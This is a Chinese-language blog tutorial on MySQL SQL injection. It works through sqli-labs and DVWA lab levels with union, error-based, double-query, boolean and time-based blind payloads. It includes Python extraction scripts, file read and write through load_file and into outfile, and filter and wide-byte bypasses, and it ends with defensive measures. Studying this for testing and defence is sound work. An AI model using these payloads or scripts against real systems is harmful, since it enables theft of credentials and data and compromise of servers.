---
title: mysql安全注入防范
date: 2020-07-08 20:57:44
tags: Mysql
---

## 什么是SQL注入
  通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，达到欺骗服务器执行恶意的SQL命令。除了URL提交，攻击者还可以通过抓包的方法在文件头等地方进行SQL注入

## 注入的危害
　(1)、数据库信息泄露：数据库中存放的用户的隐私信息的泄露
　(2)、网页串改：通过数据库对特定的网页进行篡改（网页内容存储在数据库，通过修改内
容达到网页篡改）
　(3)、网站挂马，传播恶意软件：通过修改数据库一些字段的值，嵌入网马链接，进行网马
攻击
　(4)、数据库被恶意操作：数据库被攻击，数据库的系统管理员账户被篡改
　(5)、获取webshell：利用数据库存在的权限分配缺陷获取webshell甚至是系统权限
## 注入产生的因素
 （1)、不严格校验 
 （2)、恶意修改 
 （3)、成功拼接并执行
## 检测是否存在注入的方法
   (1)、判断是否有注入（判断是否有未严格校验），什么类型的注入
            1、可控参数的改变能否影响页面显示结果
            2、输入的sql语句是否能报错--能通过数据库的报错，可以看到一些语句痕迹
            3、输入的sql语句能否不报错--语句能够成功闭合
   (2)、语句是否能够被恶意修改
   (3)、是否能否成功执行
   (4)、获取想要的数据
## SQL注入常识
### 1.布尔查询
or查询：可查到定义表中的字段值
### 2.union查询
（1）猜字段数 （select 1,2,3.... 或者 order by 1,order by 3... 都是看报错）
（2）如何获取库名，表名，字段名
（3）权限问题
### 3.information_schema(数据库字典)
information_schema这这个数据库中保存了MySQL服务器所有数据库的信息。
如数据库名，数据库的表，表栏的数据类型与访问权限等。
再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，
每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。
``` bash
  information_schema.schemata中的列schema_name记录了所有数据库的名字
  information_schema.tables中的列table_schema记录了所有数据库的名字
  information_schema.tables中的列table_name记录了所有数据库的表的名字
  information_schema.columns中的列table_schema记录了所有数据库的名字
  information_schema.columns中的列table_name记录了所有数据库的表的名字
  information_schema.columns中的列column_name记录了所有数据库的表的列的名字
 
```
 MySQL版本5.0 以下没有 information_schema 这个系统表，无法列表名等，只能暴力跑表名。
5.0 以下是多用户单操作，5.0 以上是多用户多操做
example: select concat(table_name) from information_schema.tables where table_schema=database()
### 4.手动注入
(1)基于错误的注入：判断注入点？单引号？
(2)基于布尔的注入：闭合前面的sql语句，构造or和and的逻辑语句，-- 用来注释后面所有语句
(3)基于union的注入：
``` bash
user()：当前用户名
     database()：当前数据库名
     version()：数据库版本信息
'union select 1,table_schema from information_schema.tables -- hh  #查库名
'union select 1,table_name from information_shcema.tables where table_schema="..." #查当前库中所有表
'union select 1,column_name from information_schema.columns where table_name="..."  #查当前表中所有字段
 
```

#concat实现字段拼接
'union select user,concat(first_name,'  ',last_name,'  ',password) from users -- '
#group_concat
#concat_ws
### 5.报错注入

{% codeblock %}
（1）extractvalue(xml_document,Xpath_string)                        从目标XML中返回包含所查询值的字符串
 （2）Updatexml(xml_document,Xpath_string,new_value)      注入报错点在Xpath_string 位置,因此其它位置可以任意处理,譬如写1.`
 DVWA Security='low':
  and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)# 0x7e为~的16进制ASCII码
 
  and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='dvwa'),0x7e),1)#
 
 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'),0x7e),1)#
 
  and updatexml(1,concat(0x7e,(select group_concat(user_id,last_name) from users),0x7e),1)#
 
{% endcodeblock %}
其中:
XML_document是string格式，为XML文档对象的名称
Xpath_string(Xpath格式的字符串)，自主学习。
new_value,string格式，替换查找到的符合条件的数据
### 6.双注入（双查询报错注入，两个select）
原理: 利用group by主键冲突报错获取数据库信息.
几个函数:
floor()                     #向下取整
       rand()                      #返回（0,1）随机值,rand()*2 返回(0,2)随机值
       floor(rand()*2)             # 向下取整则返回值为0或1.
       group by                    #分组
       count()                    #返回当前的表的所有的记录数
举例:

{% codeblock %}
 Sqli-labs Less-11(payload)
 uname=admin' union select 1,count(1) from information_schema.tables  group by
  group_concat( floor(rand()*2),(select table_name from information_schema.tables where table_schema='security' )) %23&passwd=123
 
{% endcodeblock %}
### 7.布尔盲注
普通注入不能直接回显错误信息。
和时间盲注相同的是，每次只判断一个字符。
?id=1' and substr(database(),1,1)=1 #
示例:
Sqli-labs Less-6
该关卡只有两种返回结果，当查询存在时返回“You are in...”，否则返回为空。
?id=1' and 1=1 --+回显You are in...........
?id=1' and 1=2 --+不回显
根据这种情况，可以由substr()函数每次判断一个字符，python脚本进行布尔盲注,具体如下:
{% codeblock %}
 import requests
 s = requests.Session()
 url = 'http://localhost:8080/sqli-labs/Less-6/'
 payloads = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz[{\|]}^~_,'
 data = ''
 
 for i in range(50):
     for j in payloads:
         payload = f"?id=1\" and substr(binary database(),{i},1)='{j}'%23"
         #payload = f"?id=1\" and substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,{i},1)='{j}'%23"
         #payload = f"?id=1" and substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,{i},1)='{j}'%23"
         #payload = f"?id=1" and substr((select binary group_concat(password,' ') from security.users) ,{i},1)='{j}'%23"
         if "You are in..........." in s.get(url+payload).text:
             data += j
             break
     print(data)
{% endcodeblock %}

### 8.时间盲注
?id=1' union select(if(substr(database(),1,1))>1,sleep(3),1)         #此外还有bench()函数
示例：
Sqli-labs Less-9
此处可以发现无论查询对错都只回显You are in...........
测试?id=1' and sleep(3)%23 页面会延时3秒再回显，判断为时间盲注.
编写脚本进行时间盲注，如下：
{% codeblock %}
import requests
url = 'http://localhost:8080/sqli-labs/Less-9/'
payloads = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz[{\|]}^~_,'
data = ''
for i in range(50):
    for j in payloads:
        payload = f"?id=1' and if((substr(binary database(),{i},1)='{j}'),sleep(1),1)%23"
        #正确的时候等待1秒钟，不正确的时候直接返回
        # payload = f"?id=1' and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,{i},1)='{j}'),sleep(1),1)%23"
        #payload = f"?id=1' and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,{i},1)='{j}'),sleep(1),1)%23" 
        try:
            r = requests.get(url+payload, timeout=1)
        except Exception:
            data += j
            print(data)
            break
            {% endcodeblock %}
### 9.cookie注入
注入位置在http请求的cookie处
### 10.HTTP-Referer注入
注入位置在http请求的Referer处
### 11.SQL注入读取文件
Load_file(filename): 读取文件并返回改文件的内容作为一个字符串。
使用条件：
A.必须有权限读取且文件必须完全可读
B.欲读取文件必须在服务器上
C.必须指定文件的完整路径(绝对路径)
D.欲读取文件的大小必须小于max_allowed_packet
示例:
{% codeblock %}
?id=-1' union select 1,2,Load_file("D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-1\\index.php") --+﻿
{% endcodeblock %}
写文件（into outfile)：
{% codeblock %}
?id=-1' union select 1,2,3 into outfile "D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-1\\index.php" --+
{% endcodeblock %}
示例:
Sqli-labs Less-7
测试发现id=1'报错，但把后面的语句注释掉扔报错，还有括号闭合，发现加两个括号判断为(('$id'))闭合，再根据提示Use outfile…，应该是使用导出语句了。
（1）首先判断是否有权限：
{% codeblock %}
?id=1')) and (select count(*) from mysql.user)>0 --+
{% endcodeblock %}
没有报错，具有root权限。
（2）于是将可以数据导出, 导出所有表：
{% codeblock %}
?id=-1')) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile "D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\result.txt" --+
{% endcodeblock %}
（3）导出user表中所有列名：
{% codeblock %}
?id=-1')) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users') into outfile "D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\result.txt" --+
{% endcodeblock %}
（4）导出用户名和密码
{% codeblock %}
?id=-1')) union select 1,2,(select group_concat(username,password) from users) into outfile "D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\result.txt" --+
{% endcodeblock %}
注意：在Mysql中，需要注意路径转义的问题，即用双斜杠分隔。
### 11.绕过
(1).绕过注释符过滤(#,--+)
示例：
{% codeblock %}
Sqli-labs Less-13
{% endcodeblock %}
方法一(报错注入)
{% codeblock %}
?id=1' or (extractvalue(1,concat(0x7e,version()))) or '
?id=1' or (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))) or '
{% endcodeblock %}
方法二(闭合后面的内容)
{% codeblock %}
?id=' union select 1,'
{% endcodeblock %}

(2).绕过and-or过滤
01.大小写绕过:
or的几种形式(Or,oR,OR,||)
and的几种形式(And,...,&&)     #对大小写敏感可使用
02.双写绕过
{% codeblock %}
?id=1' oorrder by 1 --+
{% endcodeblock %}
判断回显列数也可用：
{% codeblock %}
?id=1' union select 1,2,3...   #(逐个尝试比较慢)
{% endcodeblock %}
之后使用报错注入即可：
{% codeblock %}
?id=-1' oorr extractvalue(1,concat(0x7e,database())) --+  #(获取当前数据库名)
{% endcodeblock %}
或者使用：
{% codeblock %}
?id=-1' || extractvalue(1,concat(0x7e,database())) --+
{% endcodeblock %}
(3).绕过空格过滤
其他字符代替：
%09 TAB 键(水平)
%0a 新建一行
%0b TAB 键(垂直)
%0c 新的一页
%0d return 功能
%a0 空格
/**/ 代替空格
?id=1' or (内容) or (内容)'           #一种注入的形式
(4).内联注释过滤
形如/*!(关键字)*/
example:
/*!and*/

/*!select*/
(5).特殊字符转义与宽字节注入
特殊字符转义的三种方法:
(1)自定义转义函数
{% codeblock %}
function check_addslashes($string){
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);
    //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);
    //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);
    //escape double quote with a backslash
    return $string;
}
{% endcodeblock %}
(2)调用函数 addslashes()
(3)调用函数 mysql_real_escape_string()
这几种方法都可能被宽字节注入绕过
宽字节注入原理分析:
以单引号'为例，它被转义为'，我们的目标是去掉反斜杠，将'逃逸出来。现在我们不输入'，而是输入%df'，被转义后它变成：%df'，也相当于%df%5c%27(%5c表示反斜杠\ )，之后在数据库查询前由于使用了GBK多字节编码，%df%5c会gbk编码转换成为汉字"運"，从而使得%27，也就是单引号逃逸。
宽字节注入与普通注入payload上的区别就是：在会被转义的字符前加上%df,''被吃掉，从而使得被转义字符逃逸。当然此处不一定必须是%df,只要(填充的字符+%5c)在GBK编码中，可以使得被转义字符逃逸就行，之后进行后续注入。
示例：Sqli-labs Less-32
payload1:?id=1'
可以看到此处的单引号被转义
payload2:?id=1%df'
根本原因:
character_set_client(客户端的字符集)和 character_set_connection(连接层的字符集)不同,或转换函数如，iconv、mb_convert_encoding 使用不当。
解决方法:
统一数据库、Web 应用、操作系统所使用的字符集，避免解析产生差异，最好都设置为 UTF-8。或对数据进行正确的转义，如 mysql_real_escape_string+mysql_set_charset 的使用。
(6).二次注入
(7).过滤函数绕过

## SQL注入防御
通过前面的讲解我们得知，要想成功利用SQL注入漏洞，需要同时满足两个条件，一是攻击者可以控制用户的输入，二是注入的代码要被成功执行。下面的内容主要围绕这两个方面来展开。
　　【从源头进行防御的思想】即需要对从其他地方传递过来的参数在进入数据库之前进行正确的处理。主要有以下几个方面
　　1、在表单中通过js绑定数据类型、或者过滤一些非法字符
　　2、连接数据库时，使用预编译语句，绑定变量【PHP中使用mysqli、PDO进行连接使用数据库】
　　3、在数据进入后台逻辑时，先对传入的参数进行验证，确保符合应用中定义的标准。主要有白名单和黑名单两种方法来实现。从理论上来讲，白名单的安全性要比黑名单高，因为它只允许在白名单中定义的数据通过，其他数据都会被过滤掉。黑名单只会过滤定义在黑名单中的数据（比如SQL注入中的一些危险字符），通常使用正则表达式来实现。但需要注意的是，由于黑名单不可能包含所有的危险字符，所以可能会出现黑名单被绕过的情况。例如在mysql注入中，当在黑名单中过滤了空格字符，我们可以使用"/*（mysql中注释符）"和"+"来代替空格，绕过黑名单的限制继续注入，因此我们应该尽量多使用白名单。

### 代码层
01.黑名单
02.白名单
03.敏感字符过滤
04.使用框架安全查询
05.规范输出
### 配置层
01.开启GPC
02.使用UTF-8
### 物理层
01.WAF
02.数据库审计
03.云防护
04.IPS(入侵防御系统)
01.使用安全的API
02.对输入的特殊字符进行Escape转义处理
03.使用白名单来规范化输入验证方法
04.对客户端输入进行控制，不允许输入SQL注入相关的特殊字符
05.服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。
